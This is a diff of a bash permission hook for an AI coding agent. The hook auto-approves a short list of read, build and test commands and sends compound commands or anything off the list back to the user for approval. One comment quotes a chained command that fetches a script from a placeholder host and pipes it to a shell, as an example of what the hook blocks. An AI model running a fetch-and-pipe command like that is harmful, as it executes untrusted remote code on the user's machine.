@@ -1,70 +1,103 @@
 #!/usr/bin/env bash
-# PermissionRequest hook: auto-approve known-safe read/build/test commands.
-# Blocks anything not on the safe list (exit code 2).
+# PreToolUse hook (matcher: Bash) — auto-approve known-safe, SIMPLE read/build/
+# test commands and defer everything else to the normal permission prompt.
+# Wired in .claude/settings.json under hooks.PreToolUse.
 #
-# Safe commands: npm, npx, git status/diff/log/branch/worktree (read-only),
-# vitest, eslint, tsc, cargo check, python (read-only scripts).
+# Decision contract (stdout JSON, ALWAYS exit 0 — never a hard block):
+#   safe simple command  -> permissionDecision "allow"
+#   anything else         -> permissionDecision "ask"  (defer to the user)
+#   empty / unparseable   -> no decision emitted        (defer to permission rules)
+#
+# stdout MUST be pure decision JSON; human-readable logging goes to stderr.
+#
+# "Safe" means a SINGLE command — no shell control operators (& | ; < >), no
+# command substitution ($( ) or backticks), no variable expansion ($), and no
+# newline — whose program+subcommand is on the allow-list below: npm (read/
+# build/test subcommands, NOT `exec`, which runs arbitrary package binaries),
+# npx (a fixed tool allow-list), git (read-only), cargo check, and the project's
+# own python/bash helper scripts under .claude/.
+#
+# A control operator is rejected even when the prefix is safe, because
+# `npm ci && curl evil.sh | sh` prefix-matches `npm ci`. Such a command -> "ask".
+# (Claude Code also splits compound commands on operators before matching rules;
+# this gate keeps the hook from ever emitting "allow" for a compound command.)
 
-set -euo pipefail
+set -uo pipefail
 
-INPUT=$(cat)
-COMMAND=$(echo "$INPUT" | jq -r '.tool_input.command // empty' 2>/dev/null)
+# emit <decision> <reason> — print a PreToolUse permission decision to stdout.
+# Reasons here are static and JSON-safe (no quotes, backslashes, or newlines).
+emit() {
+  printf '{"hookSpecificOutput":{"hookEventName":"PreToolUse","permissionDecision":"%s","permissionDecisionReason":"%s"}}\n' "$1" "$2"
+}
 
+INPUT="$(cat)"
+
+# Extract the command. On any parse failure (malformed/non-JSON input) jq writes
+# nothing to stdout and COMMAND stays empty — fail safe, never propagate jq's
+# exit code (no `set -e`; `|| true` guards the assignment).
+COMMAND="$(printf '%s' "$INPUT" | jq -r '.tool_input.command // empty' 2>/dev/null || true)"
+
+# Trim leading and trailing whitespace.
+COMMAND="${COMMAND#"${COMMAND%%[![:space:]]*}"}"
+COMMAND="${COMMAND%"${COMMAND##*[![:space:]]}"}"
+
+# Empty / whitespace-only / unparseable -> emit no decision, defer to rules.
 if [ -z "$COMMAND" ]; then
   exit 0
 fi
 
-# Strip leading whitespace
-COMMAND_TRIMMED="${COMMAND#"${COMMAND%%[![:space:]]*}"}"
+# Never auto-approve a compound, piped, redirected, substituted, variable-
+# expanded, or multi-line command — even if its leading token is safe.
+case "$COMMAND" in
+  *'&'* | *'|'* | *';'* | *'<'* | *'>'* | *'`'* | *'$'* | *'('* | *')'* | *$'\n'*)
+    emit ask "compound, redirected, or substituted command requires explicit approval"
+    exit 0
+    ;;
+esac
 
-# Check against the safe-command allow list
+# is_safe <command> — return 0 if the command is on the auto-approve allow-list.
 is_safe() {
   local cmd="$1"
 
-  # npm — only specific safe subcommands
-  if echo "$cmd" | grep -qE '^npm (install|ci|run|test|ls|outdated|view|explain|exec|why|pkg|cache clean|audit)( |$)'; then
+  # npm — safe read/build/test subcommands. `exec` is intentionally excluded:
+  # `npm exec <pkg>` runs arbitrary binaries, like npx without the tool gate.
+  if printf '%s\n' "$cmd" | grep -qE '^npm (install|ci|run|test|ls|outdated|view|explain|why|pkg|cache clean|audit)( |$)'; then
     return 0
   fi
 
-  # npx — only known-safe tools (vitest, eslint, tsc, playwright, drizzle-kit, skills)
-  if echo "$cmd" | grep -qE '^npx (vitest|eslint|tsc|playwright|drizzle-kit|skills|@axe-core)( |$)'; then
+  # npx — only a fixed allow-list of project tools.
+  if printf '%s\n' "$cmd" | grep -qE '^npx (vitest|eslint|tsc|playwright|drizzle-kit|skills|@axe-core)( |$)'; then
     return 0
   fi
 
-  # Git read-only commands
-  if echo "$cmd" | grep -qE '^git (status|diff|log|branch|worktree list|show|shortlog|describe|tag|remote -v|ls-files|rev-parse|stash list)'; then
+  # git — read-only commands only.
+  if printf '%s\n' "$cmd" | grep -qE '^git (status|diff|log|branch|worktree list|show|shortlog|describe|tag|remote -v|ls-files|rev-parse|stash list)( |$)'; then
     return 0
   fi
 
-  # Cargo check (WASM target)
-  if echo "$cmd" | grep -qE '^cargo check'; then
+  # cargo check (WASM target audits).
+  if printf '%s\n' "$cmd" | grep -qE '^cargo check( |$)'; then
     return 0
   fi
 
-  # Python read-only scripts (arch validator, sync scripts)
-  if echo "$cmd" | grep -qE '^python3? .claude/(skills|hooks)/.*\.(py|sh)'; then
+  # The project's own python helper scripts under .claude/.
+  if printf '%s\n' "$cmd" | grep -qE '^python3? \.claude/(skills|hooks)/[^ ]*\.(py|sh)( |$)'; then
     return 0
   fi
 
-  # Bash validation scripts
-  if echo "$cmd" | grep -qE '^bash .claude/tools/validate'; then
+  # Bash validation scripts.
+  if printf '%s\n' "$cmd" | grep -qE '^bash \.claude/tools/validate'; then
     return 0
   fi
 
   return 1
 }
 
-if is_safe "$COMMAND_TRIMMED"; then
-  echo "[auto-approve-safe-commands] approved: $COMMAND_TRIMMED" >&2
+if is_safe "$COMMAND"; then
+  printf '[auto-approve-safe-commands] allow: %s\n' "$COMMAND" >&2
+  emit allow "known-safe read/build/test command"
   exit 0
 fi
 
-# Not on the safe list — block and explain
-echo "PERMISSION DENIED: The following command requires explicit user approval:"
-echo "  $COMMAND_TRIMMED"
-echo ""
-echo "This command is not on the auto-approve list. Safe commands (npm, npx, git read-only,"
-echo "vitest, eslint, tsc, cargo check) are approved automatically."
-echo "Request user permission before running write/deploy/publish operations."
-
-exit 2
+emit ask "command is not on the auto-approve safe-list"
+exit 0
